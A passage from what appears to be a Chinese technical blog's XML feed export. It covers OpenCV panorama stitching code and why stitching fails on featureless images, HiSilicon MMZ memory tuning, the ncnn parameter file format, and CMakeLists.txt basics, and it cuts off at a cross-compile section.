            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--rangewidth")
        &#123;
            range_width = atoi(argv[i + 1]);
            i++;
        &#125;
        else if (string(argv[i]) == "--blend_strength")
        &#123;
            blend_strength = static_cast&lt;float>(atof(argv[i + 1]));
            i++;
        &#125;
        else if (string(argv[i]) == "--output")
        &#123;
            result_name = argv[i + 1];
            i++;
        &#125;
        else
            img_names.push_back(argv[i]);
    &#125;
    if (preview)
    &#123;
        compose_megapix = 0.6;
    &#125;
    return 0;
&#125;


int main(int argc, char* argv[])
&#123;
#if ENABLE_LOG
    int64 app_start_time = getTickCount();
#endif

#if 0
    cv::setBreakOnError(true);
#endif

    int retval = parseCmdArgs(argc, argv);
    if (retval)
        return retval;

    // Check if have enough images
    int num_images = static_cast&lt;int>(img_names.size());
    if (num_images &lt; 2)
    &#123;
        LOGLN("Need more images");
        return -1;
    &#125;

    double work_scale = 1, seam_scale = 1, compose_scale = 1;
    bool is_work_scale_set = false, is_seam_scale_set = false, is_compose_scale_set = false;

    LOGLN("Finding features...");
#if ENABLE_LOG
    int64 t = getTickCount();
#endif

    Ptr&lt;FeaturesFinder> finder;
    if (features_type == "surf")
    &#123;
#ifdef HAVE_OPENCV_XFEATURES2D
        if (try_cuda &amp;&amp; cuda::getCudaEnabledDeviceCount() > 0)
            finder = makePtr&lt;SurfFeaturesFinderGpu>();
        else
#endif
            finder = makePtr&lt;SurfFeaturesFinder>();
    &#125;
    else if (features_type == "orb")
    &#123;
        finder = makePtr&lt;OrbFeaturesFinder>();
    &#125;
    else
    &#123;
        cout &lt;&lt; "Unknown 2D features type: '" &lt;&lt; features_type &lt;&lt; "'.\n";
        return -1;
    &#125;

    Mat full_img, img;
    vector&lt;ImageFeatures> features(num_images);
    vector&lt;Mat> images(num_images);
    vector&lt;Size> full_img_sizes(num_images);
    double seam_work_aspect = 1;

    for (int i = 0; i &lt; num_images; ++i)
    &#123;
        full_img = imread(img_names[i]);
        full_img_sizes[i] = full_img.size();

        if (full_img.empty())
        &#123;
            LOGLN("Can't open image " &lt;&lt; img_names[i]);
            return -1;
        &#125;
        if (work_megapix &lt; 0)
        &#123;
            img = full_img;
            work_scale = 1;
            is_work_scale_set = true;
        &#125;
        else
        &#123;
            if (!is_work_scale_set)
            &#123;
                work_scale = min(1.0, sqrt(work_megapix * 1e6 / full_img.size().area()));
                is_work_scale_set = true;
            &#125;
            resize(full_img, img, Size(), work_scale, work_scale, INTER_LINEAR_EXACT);
        &#125;
        if (!is_seam_scale_set)
        &#123;
            seam_scale = min(1.0, sqrt(seam_megapix * 1e6 / full_img.size().area()));
            seam_work_aspect = seam_scale / work_scale;
            is_seam_scale_set = true;
        &#125;

        (*finder)(img, features[i]);
        features[i].img_idx = i;
        LOGLN("Features in image #" &lt;&lt; i+1 &lt;&lt; ": " &lt;&lt; features[i].keypoints.size());

        resize(full_img, img, Size(), seam_scale, seam_scale, INTER_LINEAR_EXACT);
        images[i] = img.clone();
    &#125;

    finder->collectGarbage();
    full_img.release();
    img.release();

    LOGLN("Finding features, time: " &lt;&lt; ((getTickCount() - t) / getTickFrequency()) &lt;&lt; " sec");

    LOG("Pairwise matching");
#if ENABLE_LOG
    t = getTickCount();
#endif
    vector&lt;MatchesInfo> pairwise_matches;
    Ptr&lt;FeaturesMatcher> matcher;
    if (matcher_type == "affine")
        matcher = makePtr&lt;AffineBestOf2NearestMatcher>(false, try_cuda, match_conf);
    else if (range_width==-1)
        matcher = makePtr&lt;BestOf2NearestMatcher>(try_cuda, match_conf);
    else
        matcher = makePtr&lt;BestOf2NearestRangeMatcher>(range_width, try_cuda, match_conf);

    (*matcher)(features, pairwise_matches);
    matcher->collectGarbage();

    LOGLN("Pairwise matching, time: " &lt;&lt; ((getTickCount() - t) / getTickFrequency()) &lt;&lt; " sec");

    // Check if we should save matches graph
    if (save_graph)
    &#123;
        LOGLN("Saving matches graph...");
        ofstream f(save_graph_to.c_str());
        f &lt;&lt; matchesGraphAsString(img_names, pairwise_matches, conf_thresh);
    &#125;

    // Leave only images we are sure are from the same panorama
    vector&lt;int> indices = leaveBiggestComponent(features, pairwise_matches, conf_thresh);
    vector&lt;Mat> img_subset;
    vector&lt;String> img_names_subset;
    vector&lt;Size> full_img_sizes_subset;
    for (size_t i = 0; i &lt; indices.size(); ++i)
    &#123;
        img_names_subset.push_back(img_names[indices[i]]);
        img_subset.push_back(images[indices[i]]);
        full_img_sizes_subset.push_back(full_img_sizes[indices[i]]);
    &#125;

    images = img_subset;
    img_names = img_names_subset;
    full_img_sizes = full_img_sizes_subset;

    // Check if we still have enough images
    num_images = static_cast&lt;int>(img_names.size());
    if (num_images &lt; 2)
    &#123;
        LOGLN("Need more images");
        return -1;
    &#125;

    Ptr&lt;Estimator> estimator;
    if (estimator_type == "affine")
        estimator = makePtr&lt;AffineBasedEstimator>();
    else
        estimator = makePtr&lt;HomographyBasedEstimator>();

    vector&lt;CameraParams> cameras;
    if (!(*estimator)(features, pairwise_matches, cameras))
    &#123;
        cout &lt;&lt; "Homography estimation failed.\n";
        return -1;
    &#125;

    for (size_t i = 0; i &lt; cameras.size(); ++i)
    &#123;
        Mat R;
        cameras[i].R.convertTo(R, CV_32F);
        cameras[i].R = R;
        LOGLN("Initial camera intrinsics #" &lt;&lt; indices[i]+1 &lt;&lt; ":\nK:\n" &lt;&lt; cameras[i].K() &lt;&lt; "\nR:\n" &lt;&lt; cameras[i].R);
    &#125;

    Ptr&lt;detail::BundleAdjusterBase> adjuster;
    if (ba_cost_func == "reproj") adjuster = makePtr&lt;detail::BundleAdjusterReproj>();
    else if (ba_cost_func == "ray") adjuster = makePtr&lt;detail::BundleAdjusterRay>();
    else if (ba_cost_func == "affine") adjuster = makePtr&lt;detail::BundleAdjusterAffinePartial>();
    else if (ba_cost_func == "no") adjuster = makePtr&lt;NoBundleAdjuster>();
    else
    &#123;
        cout &lt;&lt; "Unknown bundle adjustment cost function: '" &lt;&lt; ba_cost_func &lt;&lt; "'.\n";
        return -1;
    &#125;
    adjuster->setConfThresh(conf_thresh);
    Mat_&lt;uchar> refine_mask = Mat::zeros(3, 3, CV_8U);
    if (ba_refine_mask[0] == 'x') refine_mask(0,0) = 1;
    if (ba_refine_mask[1] == 'x') refine_mask(0,1) = 1;
    if (ba_refine_mask[2] == 'x') refine_mask(0,2) = 1;
    if (ba_refine_mask[3] == 'x') refine_mask(1,1) = 1;
    if (ba_refine_mask[4] == 'x') refine_mask(1,2) = 1;
    adjuster->setRefinementMask(refine_mask);
    if (!(*adjuster)(features, pairwise_matches, cameras))
    &#123;
        cout &lt;&lt; "Camera parameters adjusting failed.\n";
        return -1;
    &#125;

    // Find median focal length

    vector&lt;double> focals;
    for (size_t i = 0; i &lt; cameras.size(); ++i)
    &#123;
        LOGLN("Camera #" &lt;&lt; indices[i]+1 &lt;&lt; ":\nK:\n" &lt;&lt; cameras[i].K() &lt;&lt; "\nR:\n" &lt;&lt; cameras[i].R);
        focals.push_back(cameras[i].focal);
    &#125;

    sort(focals.begin(), focals.end());
    float warped_image_scale;
    if (focals.size() % 2 == 1)
        warped_image_scale = static_cast&lt;float>(focals[focals.size() / 2]);
    else
        warped_image_scale = static_cast&lt;float>(focals[focals.size() / 2 - 1] + focals[focals.size() / 2]) * 0.5f;

    if (do_wave_correct)
    &#123;
        vector&lt;Mat> rmats;
        for (size_t i = 0; i &lt; cameras.size(); ++i)
            rmats.push_back(cameras[i].R.clone());
        waveCorrect(rmats, wave_correct);
        for (size_t i = 0; i &lt; cameras.size(); ++i)
            cameras[i].R = rmats[i];
    &#125;

    LOGLN("Warping images (auxiliary)... ");
#if ENABLE_LOG
    t = getTickCount();
#endif

    vector&lt;Point> corners(num_images);
    vector&lt;UMat> masks_warped(num_images);
    vector&lt;UMat> images_warped(num_images);
    vector&lt;Size> sizes(num_images);
    vector&lt;UMat> masks(num_images);

    // Preapre images masks
    for (int i = 0; i &lt; num_images; ++i)
    &#123;
        masks[i].create(images[i].size(), CV_8U);
        masks[i].setTo(Scalar::all(255));
    &#125;

    // Warp images and their masks

    Ptr&lt;WarperCreator> warper_creator;
#ifdef HAVE_OPENCV_CUDAWARPING
    if (try_cuda &amp;&amp; cuda::getCudaEnabledDeviceCount() > 0)
    &#123;
        if (warp_type == "plane")
            warper_creator = makePtr&lt;cv::PlaneWarperGpu>();
        else if (warp_type == "cylindrical")
            warper_creator = makePtr&lt;cv::CylindricalWarperGpu>();
        else if (warp_type == "spherical")
            warper_creator = makePtr&lt;cv::SphericalWarperGpu>();
    &#125;
    else
#endif
    &#123;
        if (warp_type == "plane")
            warper_creator = makePtr&lt;cv::PlaneWarper>();
        else if (warp_type == "affine")
            warper_creator = makePtr&lt;cv::AffineWarper>();
        else if (warp_type == "cylindrical")
            warper_creator = makePtr&lt;cv::CylindricalWarper>();
        else if (warp_type == "spherical")
            warper_creator = makePtr&lt;cv::SphericalWarper>();
        else if (warp_type == "fisheye")
            warper_creator = makePtr&lt;cv::FisheyeWarper>();
        else if (warp_type == "stereographic")
            warper_creator = makePtr&lt;cv::StereographicWarper>();
        else if (warp_type == "compressedPlaneA2B1")
            warper_creator = makePtr&lt;cv::CompressedRectilinearWarper>(2.0f, 1.0f);
        else if (warp_type == "compressedPlaneA1.5B1")
            warper_creator = makePtr&lt;cv::CompressedRectilinearWarper>(1.5f, 1.0f);
        else if (warp_type == "compressedPlanePortraitA2B1")
            warper_creator = makePtr&lt;cv::CompressedRectilinearPortraitWarper>(2.0f, 1.0f);
        else if (warp_type == "compressedPlanePortraitA1.5B1")
            warper_creator = makePtr&lt;cv::CompressedRectilinearPortraitWarper>(1.5f, 1.0f);
        else if (warp_type == "paniniA2B1")
            warper_creator = makePtr&lt;cv::PaniniWarper>(2.0f, 1.0f);
        else if (warp_type == "paniniA1.5B1")
            warper_creator = makePtr&lt;cv::PaniniWarper>(1.5f, 1.0f);
        else if (warp_type == "paniniPortraitA2B1")
            warper_creator = makePtr&lt;cv::PaniniPortraitWarper>(2.0f, 1.0f);
        else if (warp_type == "paniniPortraitA1.5B1")
            warper_creator = makePtr&lt;cv::PaniniPortraitWarper>(1.5f, 1.0f);
        else if (warp_type == "mercator")
            warper_creator = makePtr&lt;cv::MercatorWarper>();
        else if (warp_type == "transverseMercator")
            warper_creator = makePtr&lt;cv::TransverseMercatorWarper>();
    &#125;

    if (!warper_creator)
    &#123;
        cout &lt;&lt; "Can't create the following warper '" &lt;&lt; warp_type &lt;&lt; "'\n";
        return 1;
    &#125;

    Ptr&lt;RotationWarper> warper = warper_creator->create(static_cast&lt;float>(warped_image_scale * seam_work_aspect));

    for (int i = 0; i &lt; num_images; ++i)
    &#123;
        Mat_&lt;float> K;
        cameras[i].K().convertTo(K, CV_32F);
        float swa = (float)seam_work_aspect;
        K(0,0) *= swa; K(0,2) *= swa;
        K(1,1) *= swa; K(1,2) *= swa;

        corners[i] = warper->warp(images[i], K, cameras[i].R, INTER_LINEAR, BORDER_REFLECT, images_warped[i]);
        sizes[i] = images_warped[i].size();

        warper->warp(masks[i], K, cameras[i].R, INTER_NEAREST, BORDER_CONSTANT, masks_warped[i]);
    &#125;

    vector&lt;UMat> images_warped_f(num_images);
    for (int i = 0; i &lt; num_images; ++i)
        images_warped[i].convertTo(images_warped_f[i], CV_32F);

    LOGLN("Warping images, time: " &lt;&lt; ((getTickCount() - t) / getTickFrequency()) &lt;&lt; " sec");

    Ptr&lt;ExposureCompensator> compensator = ExposureCompensator::createDefault(expos_comp_type);
    compensator->feed(corners, images_warped, masks_warped);

    Ptr&lt;SeamFinder> seam_finder;
    if (seam_find_type == "no")
        seam_finder = makePtr&lt;detail::NoSeamFinder>();
    else if (seam_find_type == "voronoi")
        seam_finder = makePtr&lt;detail::VoronoiSeamFinder>();
    else if (seam_find_type == "gc_color")
    &#123;
#ifdef HAVE_OPENCV_CUDALEGACY
        if (try_cuda &amp;&amp; cuda::getCudaEnabledDeviceCount() > 0)
            seam_finder = makePtr&lt;detail::GraphCutSeamFinderGpu>(GraphCutSeamFinderBase::COST_COLOR);
        else
#endif
            seam_finder = makePtr&lt;detail::GraphCutSeamFinder>(GraphCutSeamFinderBase::COST_COLOR);
    &#125;
    else if (seam_find_type == "gc_colorgrad")
    &#123;
#ifdef HAVE_OPENCV_CUDALEGACY
        if (try_cuda &amp;&amp; cuda::getCudaEnabledDeviceCount() > 0)
            seam_finder = makePtr&lt;detail::GraphCutSeamFinderGpu>(GraphCutSeamFinderBase::COST_COLOR_GRAD);
        else
#endif
            seam_finder = makePtr&lt;detail::GraphCutSeamFinder>(GraphCutSeamFinderBase::COST_COLOR_GRAD);
    &#125;
    else if (seam_find_type == "dp_color")
        seam_finder = makePtr&lt;detail::DpSeamFinder>(DpSeamFinder::COLOR);
    else if (seam_find_type == "dp_colorgrad")
        seam_finder = makePtr&lt;detail::DpSeamFinder>(DpSeamFinder::COLOR_GRAD);
    if (!seam_finder)
    &#123;
        cout &lt;&lt; "Can't create the following seam finder '" &lt;&lt; seam_find_type &lt;&lt; "'\n";
        return 1;
    &#125;

    seam_finder->find(images_warped_f, corners, masks_warped);

    // Release unused memory
    images.clear();
    images_warped.clear();
    images_warped_f.clear();
    masks.clear();

    LOGLN("Compositing...");
#if ENABLE_LOG
    t = getTickCount();
#endif

    Mat img_warped, img_warped_s;
    Mat dilated_mask, seam_mask, mask, mask_warped;
    Ptr&lt;Blender> blender;
    Ptr&lt;Timelapser> timelapser;
    //double compose_seam_aspect = 1;
    double compose_work_aspect = 1;

    for (int img_idx = 0; img_idx &lt; num_images; ++img_idx)
    &#123;
        LOGLN("Compositing image #" &lt;&lt; indices[img_idx]+1);

        // Read image and resize it if necessary
        full_img = imread(img_names[img_idx]);
        if (!is_compose_scale_set)
        &#123;
            if (compose_megapix > 0)
                compose_scale = min(1.0, sqrt(compose_megapix * 1e6 / full_img.size().area()));
            is_compose_scale_set = true;

            // Compute relative scales
            //compose_seam_aspect = compose_scale / seam_scale;
            compose_work_aspect = compose_scale / work_scale;

            // Update warped image scale
            warped_image_scale *= static_cast&lt;float>(compose_work_aspect);
            warper = warper_creator->create(warped_image_scale);

            // Update corners and sizes
            for (int i = 0; i &lt; num_images; ++i)
            &#123;
                // Update intrinsics
                cameras[i].focal *= compose_work_aspect;
                cameras[i].ppx *= compose_work_aspect;
                cameras[i].ppy *= compose_work_aspect;

                // Update corner and size
                Size sz = full_img_sizes[i];
                if (std::abs(compose_scale - 1) > 1e-1)
                &#123;
                    sz.width = cvRound(full_img_sizes[i].width * compose_scale);
                    sz.height = cvRound(full_img_sizes[i].height * compose_scale);
                &#125;

                Mat K;
                cameras[i].K().convertTo(K, CV_32F);
                Rect roi = warper->warpRoi(sz, K, cameras[i].R);
                corners[i] = roi.tl();
                sizes[i] = roi.size();
            &#125;
        &#125;
        if (abs(compose_scale - 1) > 1e-1)
            resize(full_img, img, Size(), compose_scale, compose_scale, INTER_LINEAR_EXACT);
        else
            img = full_img;
        full_img.release();
        Size img_size = img.size();

        Mat K;
        cameras[img_idx].K().convertTo(K, CV_32F);

        // Warp the current image
        warper->warp(img, K, cameras[img_idx].R, INTER_LINEAR, BORDER_REFLECT, img_warped);

        // Warp the current image mask
        mask.create(img_size, CV_8U);
        mask.setTo(Scalar::all(255));
        warper->warp(mask, K, cameras[img_idx].R, INTER_NEAREST, BORDER_CONSTANT, mask_warped);

        // Compensate exposure
        compensator->apply(img_idx, corners[img_idx], img_warped, mask_warped);

        img_warped.convertTo(img_warped_s, CV_16S);
        img_warped.release();
        img.release();
        mask.release();

        dilate(masks_warped[img_idx], dilated_mask, Mat());
        resize(dilated_mask, seam_mask, mask_warped.size(), 0, 0, INTER_LINEAR_EXACT);
        mask_warped = seam_mask &amp; mask_warped;

        if (!blender &amp;&amp; !timelapse)
        &#123;
            blender = Blender::createDefault(blend_type, try_cuda);
            Size dst_sz = resultRoi(corners, sizes).size();
            float blend_width = sqrt(static_cast&lt;float>(dst_sz.area())) * blend_strength / 100.f;
            if (blend_width &lt; 1.f)
                blender = Blender::createDefault(Blender::NO, try_cuda);
            else if (blend_type == Blender::MULTI_BAND)
            &#123;
                MultiBandBlender* mb = dynamic_cast&lt;MultiBandBlender*>(blender.get());
                mb->setNumBands(static_cast&lt;int>(ceil(log(blend_width)/log(2.)) - 1.));
                LOGLN("Multi-band blender, number of bands: " &lt;&lt; mb->numBands());
            &#125;
            else if (blend_type == Blender::FEATHER)
            &#123;
                FeatherBlender* fb = dynamic_cast&lt;FeatherBlender*>(blender.get());
                fb->setSharpness(1.f/blend_width);
                LOGLN("Feather blender, sharpness: " &lt;&lt; fb->sharpness());
            &#125;
            blender->prepare(corners, sizes);
        &#125;
        else if (!timelapser &amp;&amp; timelapse)
        &#123;
            timelapser = Timelapser::createDefault(timelapse_type);
            timelapser->initialize(corners, sizes);
        &#125;

        // Blend the current image
        if (timelapse)
        &#123;
            timelapser->process(img_warped_s, Mat::ones(img_warped_s.size(), CV_8UC1), corners[img_idx]);
            String fixedFileName;
            size_t pos_s = String(img_names[img_idx]).find_last_of("/\\");
            if (pos_s == String::npos)
            &#123;
                fixedFileName = "fixed_" + img_names[img_idx];
            &#125;
            else
            &#123;
                fixedFileName = "fixed_" + String(img_names[img_idx]).substr(pos_s + 1, String(img_names[img_idx]).length() - pos_s);
            &#125;
            imwrite(fixedFileName, timelapser->getDst());
        &#125;
        else
        &#123;
            blender->feed(img_warped_s, mask_warped, corners[img_idx]);
        &#125;
    &#125;

    if (!timelapse)
    &#123;
        Mat result, result_mask;
        blender->blend(result, result_mask);

        LOGLN("Compositing, time: " &lt;&lt; ((getTickCount() - t) / getTickFrequency()) &lt;&lt; " sec");

        imwrite(result_name, result);
    &#125;

    LOGLN("Finished, total time: " &lt;&lt; ((getTickCount() - app_start_time) / getTickFrequency()) &lt;&lt; " sec");
    return 0;
&#125;


不能拼接的原因
  从上面的流程我们可知，如果要拼接成功，则首要条件是保证图片间图像重叠部分的特征点重合（匹配）的地方比较多。我们分析例子可知，特征点提取用的是SURF算法，我查阅资料可知：我认为，SURF算法主要提取的是一些突出点，比如轮廓边缘，角点。也就是说，特征点出现位置，一般都在有形状的地方或者形状变化明显的地方。
  而我拼接不成功的原因是，我图像中大部分区域都为纯白色的天花板，导致整体特征点比较少，图像重叠部分的特征点也较少，导致其匹配特征点的时候失败了。而我，改变了几个相机之间的固定视角后，总算是Stitcher类的默认算法都能拼接了。


解决思路
  用上面例子的提取特征点的源码，然后把每张图的特征点画出来，观察一下特征点的情况，根据实际情况分析和调整。
  例如下图：经过实验发现，Stitcher算法要拼接成功的要素是图间的重叠部分的特征点 重叠度和重叠数量要达到一个阈值才行。（此图就是用上面的源码，提取特征，并在原图上把图画出来）

    
        
    
    




后记

  opencv关于图像拼接的东西基本上整个原理都在例子中的cpp中，需要的时候，可以对此cpp文件结合网上大多数资料进行分析。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>计算机视觉</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>opencv</tag>
        <tag>全景</tag>
      </tags>
  </entry>
  <entry>
    <title>HISI3520DV300 折腾记录(三)之《终篇》</title>
    <url>/2018/05/28/blog_idx_064/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在本系列第一篇文章的开始，我提出了写本系列文章的原因，就是为了改变当前项目中用到的核心板的内存大小来满足当前的新需求，所以我得根据当前单板的芯片型号然后去判定这个板子的硬件情况。同时也算是在工作中第一次实际项目中用相关知识来处理这个问题，对我来说，也算是对学校中知识的复习吧！




海思的三个内存关系(MMZ,OSMEM,RAM)

  OSMEM：就是我们的操作系统所用的内存，通过free可以看见
  MMZ（Media Memory Zone）：此内存是供海思的媒体业务模块使用的内存，常用在音视频编解码等地方。此内存是通过linux driver实现的，在驱动内部对OSMEM没有使用的RAM部分进行内存管理。
  RAM：RAM=OSMEM+MMZ
  下面是一个512MB内存板子的例子（来自于海思SDK）
  DDR:

-----|-------|  0x80000000   # Memory managed by OS.              

64M  | OS    |                                                 

     |       |                                                 

-----|-------|  0x84000000   # Memory managed by MMZ block anonymous.          

448M | MMZ   |                                                 

     |       |                                                 

-----|-------|  0xA0000000   # Memory managed by MMZ block jpeg.      




内存调整

  查看MMZ内存的使用情况：
命令：cat /proc/media-mem
---MMZ_USE_INFO:
 total size=159744KB(156MB),used=15164KB(14MB + 828KB),remain=144580KB(141MB + 196KB),zone_number=1,block_number=45
  从这里的情况来看，mmz大概只用了15M的样子，剩余了141M的样子，造成了极大的浪费，考虑到后续对MMZ的一些需求，我这里将MMZ大小调整为26M的样子，做一定的预留。然后OSMEM扩展到230MB（以前是100MB）。然后在对我们的程序里面的使用的内存进行仔细的调整和优化（能用1byte不用2byte，此时内存依然很紧张啊，跑的东西太多了），达到了项目部署要求，不用更换硬件，造成项目成本上升。（注意，MMZ内存占用情况会根据你使用的实际内容改变，比如：流的路数、分辨率、采样率等可能会改变MMZ的占用内存大小，一般板子起来后，用上文的命令查看实际的占用情况，根据实际占用预留一部分内存，然后根据RAM大小来计算即可。）
  现在的MMZ使用情况：
---MMZ_USE_INFO:
 total size=26624KB(26MB),used=15164KB(14MB + 828KB),remain=11460KB(11MB + 196KB),zone_number=1,block_number=45
  现在的内存示意图：
-----|-------|  0x8000 0000   # Memory managed by OS.              

230M  | OS    |                                                 

     |       |                                                 

-----|-------|  0x8E60 0000   # Memory managed by MMZ block anonymous.          

26M | MMZ   |                                                 

     |       |                                                 

-----|-------|  0x90000000   # Memory managed by MMZ block jpeg.      




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>HISI3520DV300</tag>
        <tag>MMZ</tag>
      </tags>
  </entry>
  <entry>
    <title>《TencentNCNN系列》 之bin文件（网络参数文件）格式分析</title>
    <url>/2018/07/18/blog_idx_067/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  时间：2018.07.18
  ncnn master commit id:b3e24cafc37483dcc97ee61e6f0f6ff1b094300e
前言

  最近一段时间全在ncnn这个框架上折腾，现在有一点空闲时间，对之前的东西做一个总结。这里主要是对ncnn的参数加载做一个简要的分析。




格式分析（主要基于其源码）



前置的一些内容
  核心加载参数的代码如图所示：

    
        
    
    
  这里靠一个for循环遍历所有在load_param中已经注册好的网络，每个特殊的网络继承于Layer基类，此类有以下的重要接口：

    
        
    
    
  分别是加载模型，和加载网络，以及前向计算。


model文件对应的param文件举例

    
        
    
    
  虽然在load_model中，遍历每一层layer，其会调用基类或者当前类的load_model，这里和load_param唯一的区别是，某些layer没有任何参数，但是还是会调用一遍基类的load_model（是一个空函数）。
  对于上图来说，Input 、Pooling 等层是没有任何参数的。但是Convolution层就有参数，在convolution.cpp中，就会实现一个具体的load_model方法覆盖父的load_model，其实现如下图：

    
        
    
   


基于上图的Convolution层分析
  首先我们知道，在此层中，load_model 调用了mb.load加载具体的参数
  这里的参数分为三类：


float32


  相关读取如下：

    
        
    
   


float16
  相关读取如下：



    
        
    
   


int8 的量化类型



    
        
    
   
  这里重点介绍 int8的量化类型，其他的都是按照字节对齐的size进行读取


它会先读量化表（256的float数组）


然后读取量化表的索引


最后根据索引引索量化表，并建立mat数组，并返回






后记

  对于不同的层，参数含义不太一样，若有需求，可针对分析。上文例子中，参数主要是卷积层的权重（weight），以及偏移量（blas）
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
      </categories>
      <tags>
        <tag>DL</tag>
        <tag>ncnn</tag>
      </tags>
  </entry>
  <entry>
    <title>CMakeLists.txt 编写要点 &amp;&amp; 一个关于install（）的深坑</title>
    <url>/2018/08/07/blog_idx_069/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Linux  4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
前言



我在2016-05-08的时候，写了一篇关于Makefile的文章，在我来此公司实习的时候（2016.11左右），为一个稍微大一点的项目完全手动的构建了一个基于Makefile的编译环境。现在已经过去了一年半多左右，根据此项目组的成员给我的反馈是：依然可用。但是如果要添加一些新内容到项目中，如果不了解这个Makefile的话，很有可能就是新内容没有生效。我想了想，也确实是这样的，如果不对Makefile进行一部分了解的话，想添加新的内容是很麻烦的一件事情。但是这个问题其实是Makefile只是在shell command上的一层封装，抽象的层级不是太高，也就导致了本身其构建起来很繁琐，不太适合大型工程管理和构建。


根据这两年来的接触，我经常了解到封装层级在Makefile上的框架有两个，一个是Autoconfig，一个就是CMake。其中我Autoconfig我完全停留在用的层面，完全没有去了解相关的内容，但是对于CMake，近一年多来，多次接触，苦于没有一个合适的机会进行总结。最近，由于需要为一个项目构建一套合适的编译环境，我选择了CMake，也许，这是一个合适的机会进行总结。


注意：也许我这里介绍的CMake用起来比Make或者更低一级的gcc简单了许多倍，但是，我希望各位学习此文的同时，一定要去了解了解Make和GCC相关的内容，别的不说，自己写个小工程，分别用gcc原始命令生成目标，同时用Make来生成目标。这样或许你会对此篇文章更加深刻。




CMake 简要内容

  CMake 是cross platform make的简写，从这里你完全可以看出，CMake是基于Make来实现相关的内容的，换句话说，CMake就是在Make的基础上抽象出来的更高级的框架。
  CMakeLists.txt的编译test.cpp生成test可执行文件的基本例子：
cmake_minimum_required(VERSION 2.8.10)
SET(PROJECT_NAME test)
project($&#123;PROJECT_NAME&#125;)
add_executable(test test.cpp)  
  通过以下Shell Command:
mkdir -p build &amp;&amp; cd build &amp;&amp; cmake .. &amp;&amp; make 
  通过上文的shell命令，其实你也已经发现了，cmake会生成Makefile，然后我们需要调用make来生成可执行文件。




CMakeLists.txt 编写要点



常用的cmake指令解释
cmake_minimum_required(VERSION xxx) #cmake最小版本需求，新版本的cmake改了很多东西，提升了便利性，也可能让你自己挖坑了
project(xxx) #设置此项目的名称
add_executable(target target_source_codes) #生成可执行文件target ，后面填写的是生成此可执行文件所依赖的源文件列表。
SET(var_name var_value)# 设置一个名字var_name 的变量，同时给此变量赋值为var_value
MESSAGE(&quot;MSG&quot;) #类比echo 打印消息
option(var_name &quot;comment&quot; var_value) #给变量var_name赋值为var_value，comment是此变量的注释，和SET 有类似的功效，用于给某变量设置默认值
include_directories(xxx) #添加include路径，也就是 gcc -I xxx 的意思，或者vs ide中添加头文件包含目录
add_subdirectory(xxx) #调用xxx子目录的CMakeLists.txt执行
add_compile_options(xxx) #给编译器添加xxx参数，但是貌似没有什么用，我一般不这样添加参数，不直接
link_directories(xxx) #给编译器添加库目录，也就是 gcc -L xxx 的意思，或者vs ide中添加库的包含目录
add_library(lib_name SHARED or STATIC lib_source_code) #和add_executable类似，生成库文件，SHARED代表动态库，STATIC代表静态库， 最后一个参数代表此库的源文件列表，此指令只有三个参数
target_link_libraries(target_name lib_name ...) #给目标添加依赖库，类似与gcc -l lib_name，此指令有两个用处，一个是给可执行target_name 添加库依赖，二是给库target_name 添加库依赖。

  我常见的cmake指令也就是上述的这些，还有部分比较常见的指令这里没有列出，我放到了下面单独讲解如：install()


cmake 流控制指令相关
  条件语句
if(xxx)
...
elseif(xx)
...
else()
...
endif()

#常见条件语句用法为:
# if (va)  va为bool型
# if （va MATCHES xxx） va 是string类型，如果va包含了xxx，则此句为真
  循环语句
foreach(va va_lists)
...
endforeach()
  在foreach中，va的值会依次被va_lists的值替换


macro 和 function
macro(name arg ...)
...
endmacro()
function(name arg ...)
...
endfunction()
  宏和函数效果都类似，唯一区别为function中的变量为局部的。


install 指令（主要是生成Makefile中的install target）
install(FILES flie DESTINATION dir_path) #执行make install时，把file拷贝到dir_path
install(PROGRAMS file DESTINATION dir_path) #执行make install时，把file拷贝到dir_path,并给予file可执行权限
INSTALL(TARGETS  ylib ylib_s
    #RUNTIME DESTINATION xxx
    LIBRARY DESTINATION lib
    ARCHIVE DESTINATION lib
)# 安装libylib.so到lib目录，安装libylib_s.a到lib目录，RUNTIME 是安装可执行文件到xxx目录，注意这个指令有个坑，我后面会说明这个问题。


configure_file指令
configure_file(fileA fileB @ONLY)
#把fileA 复制并重命名为fileB,此时，fileA中的@var@的值会被替换为cmakelists.txt 中var的值。@ONLY是只转换@va@这种变量


CMakeLists.txt常用的内置变量
CMAKE_INSTALL_PREFIX  #make install 的安装路径
CMAKE_BUILD_TYPE #生成的目标为debug或者release
CMAKE_C_FLAGS #gcc 的编译参数指定，这个非常好用，一般通过set 修改其值
CMAKE_CXX_FLAGS #g++ 和上面CMAKE_C_FLAGS 类似
CMAKE_CURRENT_SOURCE_DIR # 当前CMakeLists.txt所在的目录，主要用来定位某文件
CMAKE_CURRENT_BINARY_DIR # 当前CMakeLists.txt对应的编译时的目录



cross compile
  2019/5/17更新
set(CMAKE_SYSTEM_NAME Linux)
